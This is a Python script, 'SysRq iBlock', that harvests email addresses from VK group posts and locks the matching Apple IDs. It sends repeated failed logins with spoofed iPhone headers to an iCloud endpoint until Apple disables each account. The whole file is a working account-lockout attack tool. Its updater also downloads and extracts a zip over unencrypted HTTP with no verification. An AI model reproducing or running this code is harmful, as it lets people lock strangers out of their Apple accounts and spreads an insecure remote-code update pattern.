#!/usr/bin/env python3
# coding=utf-8

#   Copyright 2015 Matvey Vyalkov
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.

"""
Blocking Apple IDs
"""
__author__ = 'CyberTailor <cybertailor@gmail.com>'
__version__ = "0.5.1"
v_number = 2

import argparse
import tempfile
import zipfile
import os
import json
import configparser
import gettext
import re
import time
from timeout_decorator import timeout_decorator
from getpass import getpass
from email.utils import parseaddr
from urllib import request
from urllib.parse import urlencode
from vk_api_auth.vk_auth import auth
from xmltodict.xmltodict import parse

scriptdir = os.path.abspath(os.path.dirname(__file__))
gettext.install("iblock", "{}/locale".format(scriptdir))


def parse_cmd_args():
    """
    Parsing command-line arguments.
    """
    parser = argparse.ArgumentParser(description=_("Blocking Apple ID.\nSee 'iBlock.ini' for settings."))
    parser.add_argument("--version", "-v", action="version",
                        version="SysRq iBlock v{}".format(__version__))
    parser.add_argument("--update", "-u", action="store_true",
                        help=_("check for updates"))
    parser.add_argument("--groups", "-g", default=[],
                        help=_("specify groups where the program will look for Apple IDs (by comma)"))
    parser.add_argument("--ids", "-I", default=[],
                        help=_("specify Apple IDs which the program will block (by comma)"))
    parser.add_argument("--login", "-l", action="store_true",
                        help=_("get access to vk.com"))
    parser.add_argument("--interval", "-i", type=float, default=3,
                        help=_("set scanning interval (in minutes) [3]"))
    parser.add_argument("--posts", "-p", type=int, default=50,
                        help=_("set posts limit for scanning [50]"))

    return vars(parser.parse_args())


def parse_conf():
    """
    Parsing 'iBlock.ini'
    """
    parsed_conf = {}
    config = configparser.ConfigParser(allow_no_value=True)
    conffile = "{}/iBlock.ini".format(scriptdir)
    config.read(conffile)

    parsed_conf["token"] = config["DEFAULT"]["token"]
    parsed_conf["pass"] = config["DEFAULT"]["password"]
    parsed_conf["groups"] = [group_name for group_name in config["groups"]][:-2]
    parsed_conf["ids"] = [aid for aid in config["IDs"]][:-2]
    return parsed_conf


def upgrade():
    """
    Upgrading program
    """
    print(_("Creating temporary directory..."))
    tmpdir = tempfile.mktemp(prefix="sysrq-")
    os.mkdir(tmpdir)
    print(_("Downloading new version..."))
    archive_file = "{}/iBlock.zip".format(tmpdir)
    request.urlretrieve("http://net2ftp.ru/node0/CyberTailor@gmail.com/iblock.zip",
                        filename=archive_file)
    print(_("Unpacking archive..."))
    archive = zipfile.ZipFile(archive_file)
    archive.extractall(path=scriptdir)  # extract ZIP to script directory
    print(_("Exiting..."))
    exit()


def upd_check():
    """
    Checking for updates
    """
    latest_file = request.urlopen(
        "http://net2ftp.ru/node0/CyberTailor@gmail.com/versions.json").read().decode("utf-8")
    latest = json.loads(latest_file)["iblock"]
    if latest["number"] > v_number:
        print(_("Found update to version {}!\n\nChangelog:").format(latest["version"]))
        print(request.urlopen(
            "http://net2ftp.ru/node0/CyberTailor@gmail.com/iblock.CHANGELOG").read().decode("utf-8"))
        choice = input(_("\nUpgrade? (Y/n)")).lower()
        update_prompt = {"n": False, "not": False, "н": False, "нет": False}.get(choice, True)
        if update_prompt:
            upgrade()
        else:
            print(_("Passing update...\n"))
    else:
        print(_("You running latest version\n"))


def login():
    """
    Authorisation in https://vk.com
    :return: access_token for VK
    """
    print(_("If you're afraid for losing your account, then look for alternate method in 'iBlock.ini'"))
    email = input(_("Your login: "))
    password = getpass(_("Your password: "))
    app_id = 4716786
    token = auth(email, password, app_id, ["stats", "groups", "wall"])[0]

    config = configparser.ConfigParser(allow_no_value=True)
    conffile = "{}/iBlock.ini".format(scriptdir)
    config.read(conffile)
    config["DEFAULT"]["token"] = token
    config.write(open(conffile, mode="w"))

    return token


def call_api(method, params, token):
    """
    Calling VK API
    :param method: method name from https://vk.com/dev/methods
    :param params: parameters for method
    :param token: access_token
    :return: result of calling API method
    """
    params.append(("access_token", token))
    params.append(("v", "5.33"))
    url = "https://api.vk.com/method/{}?{}".format(method, urlencode(params))
    result = json.loads(request.urlopen(url, timeout=3.0).read().decode("utf-8"))
    if "error" in result:
        print(result["error"]["error_msg"])
    time.sleep(0.3)
    return result["response"]


@timeout_decorator.timeout(12)
def block(apple_id):
    """
    Blocking Apple ID
    :param apple_id: e-mail address
    """
    url = "https://setup.icloud.com/setup/iosbuddy/loginDelegates"
    xml_send = open("{}/data.xml".format(scriptdir)).read().format(apple_id, conf["pass"])
    headers = {'user-agent': 'Accounts/113 CFNetwork/672.0.8 Darwin/14.0.0', 'Proxy-Connection': 'keep-alive',
               'Accept': '*/*', 'Accept-Encoding': 'utf-8', 'Accept-Language': 'en-us', 'X-MMe-Country': 'US',
               'Connection': 'keep-alive', 'X-MMe-Client-Info':
                   '<iPhone4,1> <iPhone OS;7.0.4;11B554a> <com.apple.AppleAccount/1.0 (com.apple.Accounts/113)>',
               'Content-Type': 'text/plist', 'Content-length': str(len(xml_send))}
    req = request.Request(url, data=bytes(xml_send, encoding="utf-8"), headers=headers, method="POST")
    while True:
        xml_resp = request.urlopen(req, timeout=3.0).read().decode("utf-8")
        xml_data = parse(xml_resp)
        status = xml_data["plist"]["dict"]["string"]
        if status == 'This Apple ID has been disabled for security reasons.':
            print(_("Apple ID <{}> has blocked!").format(apple_id))
            break
        time.sleep(0.5)


def check_content(data):
    """
    Checking content of post.
    :param data: posts returned by API calling
    """
    for post in data:
        text = post["text"]
        for rich_line in text.splitlines():
            email = parseaddr(rich_line)[-1]
            if re.match(r"[^@]+@[^@]+\.[^@]+", email) and not email.count(" ") and not email.startswith("#"):
                try:
                    block(email)
                except timeout_decorator.TimeoutError:
                    print(_("<{}> isn't blocked (timeout)").format(email))


def scan(group_id):
    """
    Scanning groups for Apple IDs
    :param group_id: group to look for Apple IDs
    """
    group_name = call_api(method="groups.getById", params=[("group_id", group_id)], token=access_token)[0]["name"]
    for i in range(os.get_terminal_size()[0]):
        print("=", end="")
    print(_("Scanning {}...").format(group_name))
    for i in range(os.get_terminal_size()[0]):
        print("=", end="")

    cycles = args["posts"] // 100
    out = args["posts"] % 100
    for kek in range(cycles):
        data = call_api(method="wall.get",
                        params=[("owner_id", "-{}".format(group_id)), ("count", "100"), ("offset", str(i * 100))],
                        token=access_token)["items"]
        check_content(data)
    if out:
        data = call_api(method="wall.get",
                        params=[("owner_id", "-{}".format(group_id)), ("count", str(out)), ("offset", str(cycles * 100))],
                        token=access_token)["items"]
        check_content(data)


if __name__ == "__main__":
    args = parse_cmd_args()
    conf = parse_conf()
    if args["update"]:
        upd_check()

    if not conf["token"] or args["login"]:
        access_token = login()
    else:
        access_token = conf["token"]

    call_api(method="stats.trackVisitor", params=[], token=access_token)  # needed for stats gathering

    id_list = []
    if args["ids"]:
        id_list.extend(args["ids"].split(","))
    id_list.extend(conf["ids"])

    group_list = []
    if args["groups"]:
        group_list.extend(args["groups"].split(","))
    group_list.extend(conf["groups"])

    while True:
        for group in group_list:
            gid = (call_api(method="groups.getById",
                            params=[("group_id", group.split("/")[-1])], token=access_token))[0]["id"]
            scan(group_id=gid)

        for gayple_id in id_list:
            try:
                block(gayple_id)
            except timeout_decorator.TimeoutError:
                print(_("<{}> isn't blocked (timeout)").format(gayple_id))

        for i in range(os.get_terminal_size()[0]):
            print("-", end="")
        print()
        time.sleep(args["interval"] * 60)